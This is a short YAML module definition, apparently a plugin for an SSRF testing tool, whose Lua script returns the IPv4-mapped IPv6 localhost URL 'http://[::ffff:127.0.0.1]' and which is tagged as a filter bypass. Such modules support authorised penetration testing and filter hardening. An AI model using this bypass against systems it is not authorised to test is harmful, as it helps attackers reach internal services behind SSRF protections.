meta:
  id: ipv6_mapped_localhost
  version: 1
  name: "IPv4 mapped IPv6 localhost"
  description: "Generates IPv4-mapped IPv6 localhost variants."

  author: "SSRFdevil"
  created: "2026-06-18"
  updated: "2026-06-18"

  rank: 60
  confidence: 95
  severity: medium

  tags:
    - ipv6
    - localhost
    - bypass

  references: []

match:
  schemes:
    - http
    - https

  requires:
    - hostname

  supports:
    - ipv6

script:
  language: lua
  entry: bypass

  source: |
    function bypass(ctx)
      return {
        url = "http://[::ffff:127.0.0.1]"
      }
    end